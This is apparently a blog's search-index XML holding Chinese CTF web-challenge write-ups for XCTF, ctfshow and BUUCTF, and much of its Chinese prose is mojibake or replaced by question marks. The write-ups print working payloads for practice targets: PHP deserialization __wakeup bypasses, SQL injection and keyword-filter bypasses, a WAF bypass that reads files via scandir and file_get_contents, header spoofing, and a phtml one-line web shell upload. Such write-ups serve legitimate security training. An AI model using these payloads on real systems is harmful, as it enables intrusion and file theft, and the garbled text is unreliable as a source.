<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ</title>
    <url>/2021/12/14/123456/</url>
    <content><![CDATA[<h1 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h1><p>è¿™ä¸€é“é¢˜æ²¡æœ‰ç»™ç¯å¢ƒï¼Œæ‰“å¼€é™„ä»¶çœ‹çš„æˆ‘ä¸€è„¸æ‡µï¼Œè¿˜è¿˜ä»¥ä¸ºæ˜¯åŠ å¯†äº†ï¼Œä½†æƒ³ä¸€æƒ³åˆä¸åƒæ˜¯è¢«åŠ å¯†äº†ã€‚ç„¶åçœ‹åˆ°äº†ç†Ÿæ‚‰çš„æ ‡ç­¾ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯xssï¼Œä½†æ˜¯æˆ‘åˆä¸çŸ¥é“è¯¥ä»ä½•ä¸‹æ‰‹ã€‚äºæ˜¯å»çœ‹äº†wp,æ„Ÿè§‰è‡ªå·±å¥½æ‡’ï¼Œå‡½æ•°æ‡’å¾—å»æœï¼Œæœç„¶è¿˜æ˜¯å‡½æ•°å‡ºäº†é—®é¢˜ã€‚</p>
<script>_='function $(){e=getEleById("c").value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\'_ns=[t,n,r,i];for(o=0;o<13;++o){    [0]);.splice(0,1)}}}    \'<input id="c">< onclick=$()>Ok</>\');delete _var ","docu.)match(/"];/)!=null=["    write(s[o%4]buttonif(e.ment';for(Y in $='    ')with(_.split($[Y]))_=join(pop());eval(_)</script>

<p>é—®é¢˜å°±å‡ºåœ¨evalè¿™ä¸ªå‡½æ•°èº«ä¸Šï¼Œeval(string)å‡½æ•°å¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„JavaScriptä»£ç ã€‚<img src="/2021/12/14/123456/2173462-20210112131239936-1971780407.png" class="" title="img"></p>
<p>ä»–æŠŠ$()å½“ä½œå­—ç¬¦ä¸²æ‰§è¡Œè€Œå¯¼è‡´ä¹±ç ï¼Œalertï¼ˆï¼‰å¯ä»¥æŠŠ$()ä¸­çš„å†…å®¹ä½œä¸ºå¼¹çª—æ˜¾ç¤ºå‡ºæ¥ï¼Œæ˜¾ç¤ºæºä»£ç ã€‚</p>
<p>å› ä¸ºæ˜¯javascript,å› æ­¤å¯ä»¥é€‰æ‹©åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ï¼Œè®©å…¶æ˜¾ç¤ºæ‰§è¡Œç»“æœï¼Œé™„ä»¶æ˜¾ç¤ºå‡ºæ¥ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œä¿®æ”¹ååœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ï¼Œæ˜¾ç¤ºå‡ºæ¥çš„æ˜¯æºä»£ç ï¼Œå¤åˆ¶æ•´ç†åå¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function $()</span><br><span class="line">&#123;</span><br><span class="line">    var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line">if(e.match(/^be0f23/)!=null)</span><br><span class="line">if(e.match(/233ac/)!=null)</span><br><span class="line">if(e.match(/e98aa$/)!=null)</span><br><span class="line">if(e.match(/c7be9/)!=null)</span><br><span class="line">&#123;var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">var s=[t,n,r,i];</span><br><span class="line">for(var o=0;o&lt;13;++o)&#123;document.write(s[o%4][0]);</span><br><span class="line">s[o%4].splice(0,1)&#125;&#125;&#125;document.write(&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button </span><br><span class="line">onclick=$()&gt;Ok&lt;/button&gt;&#x27;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure>

<p>åˆè¦è€ƒå¯Ÿå‡½æ•°äº†ï¼Œè¿™æ¬¡è€ƒå¯Ÿçš„æ˜¯splice() </p>
<img src="/2021/12/14/123456/2173462-20210112131256987-1462219035.png" class="" title="img">

<p>è¾“å…¥æ»¡è¶³æ¡ä»¶çš„eä½¿å…¶æ˜¾ç¤ºå‡ºæ¥</p>
<p>å››ä¸ªæ­£åˆ™åŒ¹é…</p>
<p>/^be0f23/ â€”â€”â€”- ^ å¤´éƒ¨åŒ¹é…</p>
<p>/233ac/ â€”â€”â€”- ä¸­é—´åŒ¹é…</p>
<p>/e98aa$/ â€”â€”â€”- $ å°¾éƒ¨åŒ¹é…</p>
<p>/c7be9/ â€”â€”â€”- ä¸­é—´åŒ¹é…</p>
<p>æ„é€ å­—ç¬¦ä¸²e <strong>be0f233ac7be98aa</strong></p>
<p>ç„¶ååœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥å³å¯è·å¾—flag</p>
<h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>class xctf{<br>public $flag = â€˜111â€™;<br>public function __wakeup(){<br>exit(â€˜bad requestsâ€™);<br>}<br>?code=</p>
<p>exit()è¿™ä¸ªå‡½æ•°å’Œdie()è¿™ä¸ªå‡½æ•°å·®ä¸å¤šï¼Œè¾“å‡ºä¸€æ¡è„šæœ¬ä¹‹åï¼Œå°±é€€å‡ºå½“å‰è„šæœ¬ã€‚å½“ç„¶ä¸èƒ½è®©ä»–é€€å‡ºå‘€ï¼Œæƒ³åŠæ³•è®©ä»–ç»•è¿‡wakeup(),è¿™ä¸ªå‡½æ•°ã€‚</p>
<?php
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
}
$c=new xctf();
printf(serialize($c));
?>

<p>O:4:â€xctfâ€:1:{s:4:â€flagâ€;s:3:â€111â€;}</p>
<p>ç»•è¿‡åO:4:â€xctfâ€:2:{s:4:â€flagâ€;s:3:â€111â€;}</p>
<p>ï¼Ÿcode=O:4:â€xctfâ€:2:{s:4:â€flagâ€;s:3:â€111â€;}</p>
<p>è·å¾—flag</p>
<h1 id="python-template-injection"><a href="#python-template-injection" class="headerlink" title="_python_template_injection"></a>_python_template_injection</h1><p>????????python????????????????????????<br>???????&lt;type ?object?&gt;?&gt;?????&gt;?????????????????</p>
<p><strong>class</strong>  ?????????<br><strong>mro</strong>    ?????????????????????????????????<br><strong>base</strong>   ???????????  // <strong>base</strong>?<strong>mro</strong>?????????</p>
<p><strong>subclasses</strong>   ???????????????????????????????????<br><strong>init</strong>  ???????<br><strong>globals</strong>  ???????????????</p>
<h1 id="ctfshow-web-3"><a href="#ctfshow-web-3" class="headerlink" title="ctfshow web 3"></a>ctfshow web 3</h1><p>/?id=2 union select * from article where id=1000</p>
<p>?????????????????????????</p>
<h1 id="ctfshow-web-4"><a href="#ctfshow-web-4" class="headerlink" title="ctfshow web 4"></a>ctfshow web 4</h1><p>/or|-|\|/|\*|&lt;|&gt;|!|x|hex|(|)|+|select/iâ€</p>
<p>?select?????? /?id=2 || id=1000</p>
<p><strong>intval()????????????????????????????????????</strong></p>
<p><strong>????????????????</strong></p>
<p>|??????</p>
<h1 id="ctfshow-web-5"><a href="#ctfshow-web-5" class="headerlink" title="ctfshow web 5"></a>ctfshow web 5</h1><p>/?id=~~1000</p>
<p>?????payload?????get???????????????????? ?~~1000? ???????intval()???????? 0</p>
<p>?select?????????????id=1000</p>
]]></content>
  </entry>
  <entry>
    <title>buuctf</title>
    <url>/2022/01/16/buuctf/</url>
    <content><![CDATA[<h1 id="buuctf-http"><a href="#buuctf-http" class="headerlink" title="buuctf http"></a>buuctf http</h1><p>è€ƒå¯Ÿhttp,æ„Ÿè§‰å¤šå¤šå°‘å°‘æœ‰ç‚¹å¿˜è®°äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It doesn&#x27;t come from &#x27;https://Sycsecret.buuoj.cn&#x27;</span><br></pre></td></tr></table></figure>

<p>æç¤ºæˆ‘ä»¬æŠ“åŒ…ä¹‹åï¼Œä¿®æ”¹æœåŠ¡å™¨</p>
<p><strong>æœåŠ¡å™¨ä¼ªé€ </strong></p>
<p>referer: <a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></p>
<p><strong>ä¿®æ”¹æµè§ˆå™¨</strong></p>
<p>å‘åŒ…ä¹‹ååˆæç¤ºæˆ‘ä»¬è¦ç”¨Sycloverçš„æµè§ˆå™¨ï¼Œä¿®æ”¹æµè§ˆå™¨user-agent</p>
<p>ip<strong>ä¼ªé€ </strong></p>
<p>No!!!you can only read this locally!!!</p>
<p>æç¤ºæˆ‘ä»¬è¦ç”¨æœ¬åœ°Ipé“¾æ¥</p>
<p>X-Forwarded-For: 127.0.0.1</p>
<h1 id="buuctf-upload"><a href="#buuctf-upload" class="headerlink" title="buuctf upload"></a>buuctf upload</h1><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå°è¯•ç€ä¸Šä¼ ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ˜¯å¼¹çª—è¦æ±‚æ–‡ä»¶ç±»å‹ä¸ºimageï¼ŒæŠ“åŒ…ååœ¨content-typeä¿®æ”¹ä¸ºimage/jpeg,ç„¶åå‘åŒ…ï¼Œåœ¨å“åº”æ–‡ä¸­çœ‹åˆ°No!php!    å¯èƒ½æ˜¯é»‘åå•è¿‡æ»¤ï¼Œå› æ­¤å¯ä»¥å°è¯•</p>
<p>åŸºäºæ–‡ä»¶åç¼€åéªŒè¯æ–¹å¼çš„åˆ†ç±»ï¼š<br>1ã€åŸºäºç™½åå•éªŒè¯ï¼šåªé’ˆå¯¹ç™½åå•ä¸­æœ‰çš„åç¼€åï¼Œæ–‡ä»¶æ‰èƒ½ä¸Šä¼ æˆåŠŸã€‚<br>2ã€åŸºäºé»‘åå•éªŒè¯ï¼šåªé’ˆå¯¹é»‘åå•ä¸­æ²¡æœ‰çš„åç¼€åï¼Œæ–‡ä»¶æ‰èƒ½ä¸Šä¼ æˆåŠŸã€‚<br>è¿™ä¸€å…³ç¦æ­¢.jspã€.phpã€.aspã€.aspxåç¼€åçš„æ–‡ä»¶ä¸Šä¼ ã€‚</p>
<p>ä½†æ˜¯å¯ä»¥å…¶ä»–åç¼€åå˜›ï¼Œä¾‹å¦‚php1ã€php2ã€phtmlã€php5ç­‰ç­‰ã€‚</p>
<p>åœ¨å°è¯•ä¹‹åå‘ç°phtmlå¯è¡Œ</p>
<p>ç„¶åä¸Šä¼ æ–‡ä»¶ç±»å‹ä¸ºphtmlçš„ä¸€å¥è¯æœ¨é©¬ï¼ŒæŠ“åŒ…åä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸ºimage/jpeg,ç„¶åå‘åŒ…ï¼Œå“åº”æ–‡ä»¶ä¸­æç¤ºä¸èƒ½æ˜¯&lt;?,ç„¶åè€ƒè™‘å°†æ–‡ä»¶å†…å®¹ä¿®æ”¹ä¸º</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a? <span class="tag">&lt;<span class="name">scrit</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>eal($_REUEST[1])</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨éœ€è¦çŸ¥é“å›¾ç‰‡çš„ä¿å­˜è·¯å¾„äº†ã€‚<br>ä¸€èˆ¬éƒ½æ˜¯upload/filename</p>
<h1 id="ACTF2020-æ–°ç”Ÿèµ›-Upload1"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload1" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload1"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload1</h1><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼ŒæŠ“åŒ…ï¼Œå‘ç°æ²¡æŠ“ä¸Šï¼Œä¸€ç›´ä»¥ä¸ºæ˜¯æˆ‘æ“ä½œçš„é—®é¢˜ï¼Œåæ¥çœ‹äº†wpçŸ¥é“æ˜¯æ²¡æœ‰ä¸Šä¼ ä¸Šï¼Œç„¶åå°±ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åç¼€ä¸ºjpgçš„ä¸€å¥è¯æœ¨é©¬ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯èšå‰‘è¦æ±‚çš„æ˜¯phpæ–‡ä»¶ï¼Œä¸å¸‚åœºæ˜¯å°†æ–‡ä»¶åç¼€ä¿®æ”¹ä¸ºphp,ä½†æ˜¯æ²¡æœ‰ä¸Šä¼ æˆåŠŸï¼Œç„¶ååˆå°è¯•äº†phtmlï¼ŒæˆåŠŸã€‚</p>
<p>.phtmlæ–‡ä»¶å‘Šè¯‰ç½‘ç»œæœåŠ¡å™¨ï¼Œè¿™äº›æ–‡ä»¶æ˜¯ç”±æœåŠ¡å™¨ç”Ÿæˆçš„å¸¦æœ‰åŠ¨æ€å†…å®¹çš„htmlæ–‡ä»¶ï¼Œå°±åƒæµè§ˆå™¨ä¸­çš„.phpæ–‡ä»¶è¡¨ç°ä¸€æ ·ã€‚</p>
<h1 id="RoarCTF-2019-Easy-Calc1-phpå­—ç¬¦ä¸²è§£ææ¼æ´"><a href="#RoarCTF-2019-Easy-Calc1-phpå­—ç¬¦ä¸²è§£ææ¼æ´" class="headerlink" title="[RoarCTF 2019]Easy Calc1    phpå­—ç¬¦ä¸²è§£ææ¼æ´"></a>[RoarCTF 2019]Easy Calc1    phpå­—ç¬¦ä¸²è§£ææ¼æ´</h1><p>æ‰“å¼€æ˜¯ä¸€ä¸ªè®¡ç®—å™¨ï¼Œæ„Ÿè§‰æ²¡ä»€è«ç”¨ï¼Œå°è¯•äº†ä¸€ä¸‹ssti,ä¸æ˜¯ï¼Œç›´æ¥çœ‹æºä»£ç ï¼Œ</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),</span></span><br><span class="line"><span class="javascript">            <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;/div&gt;`</span>);</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;è¿™å•¥?ç®—ä¸æ¥!&quot;</span>);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®è¿™ä¸ªæç¤ºæŸ¥çœ‹æ–‡ä»¶calc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‘ç°ç»•è¿‡äº†è®¸å¤šä¸œè¥¿</p>
<!--I've set up WAF to ensure security.-->

<p>æ—¢è¦ç»•è¿‡é˜²ç«å¢™ï¼Œåˆè¦ç»•è¿‡é»‘åå•ï¼Œé€šè¿‡numæ¥è¿›è¡Œä¼ å‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dumpï¼ˆï¼‰  æ‰“å°å˜é‡ç›¸å…³ä¿¡æ¯</span><br><span class="line">chr()         è¿”å›æŒ‡å®šçš„å­—ç¬¦</span><br><span class="line">scandir()     åˆ—å‡ºæŒ‡å®šæ–‡ä»¶å’Œç›®å½•</span><br><span class="line">file_get_contents()  è®²æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨phpçš„è§£æç‰¹æ€§ï¼Œç»•è¿‡é˜²ç«å¢™æ£€æµ‹ã€‚å› ä¸ºphpè§£æGET POSTè¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨è¿‡æ»¤æ‰ç©ºæ ¼ï¼Œè€Œé˜²ç«å¢™ä¸ä¼šã€‚</p>
<p>ä¸ºä»€ä¹ˆè¦åœ¨numå‰åŠ ä¸€ä¸ªç©ºæ ¼ï¼Ÿ</p>
<p>ç­”ï¼šå‡å¦‚wafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼Œå¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼Œè¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">? num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">    ?num=file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP1</h1><p>æ‰«æå‘ç°å‹ç¼©åŒ…ï¼Œæ‰“å¼€</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–ï¼Œå…³é”®æ˜¯ç»•è¿‡</p>
<p>ç»•è¿‡_wakeup(),private</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span>=<span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);<span class="comment">//ä¼ å…¥å˜é‡</span></span><br><span class="line">  var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–åæ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.è°ƒç”¨unserialize()æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨é­”æ³•å‡½æ•°wakeup(),å¯ä»¥é€šè¿‡æ”¹å˜å±æ€§æ•°ç»•è¿‡ï¼ŒæŠŠåé¢çš„2æ”¹ä¸º3æˆ–ä»¥ä¸Šå³å¯Name</p>
<p>ç„¶åurlè¯†åˆ«ä¸äº†ï¼Œæ”¹ä¸ºâ€%22</p>
<p>å› ä¸ºæˆå‘˜ï¼ˆå±æ€§ï¼‰æ˜¯<strong>private</strong>ï¼Œæ‰€ä»¥è¦åœ¨ç±»åå’Œæˆå‘˜åå‰åŠ è¿™ä¸ªurlç¼–ç æ˜¯ç©ºçš„æ„æ€ã€‚ å› ä¸ºç”Ÿäº§åºåˆ—åŒ–æ—¶ä¸ä¼šæŠŠè¿™ä¸ªä¹Ÿè¾“å‡ºã€‚**%00**ç©º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL1</h1><p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near â€˜1,2,3#â€™â€™ at line 1</p>
<p>å¯çŸ¥union selectè¢«è¿‡æ»¤ï¼Œuunionnion,sselectelectå¯ç»•è¿‡</p>
<p>åæ¥æ“ä½œå¯çŸ¥orä¹Ÿè¢«è¿‡æ»¤ï¼Œoorrå¯ç»•è¿‡</p>
<p>æ ¹æ®æŠ¥é”™æç¤ºçŸ¥é“å“ªäº›è¢«è¿‡æ»¤äº†ï¼ŒåŒå†™ç»•è¿‡å³å¯</p>
<h1 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h1><p>æ‰«æ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 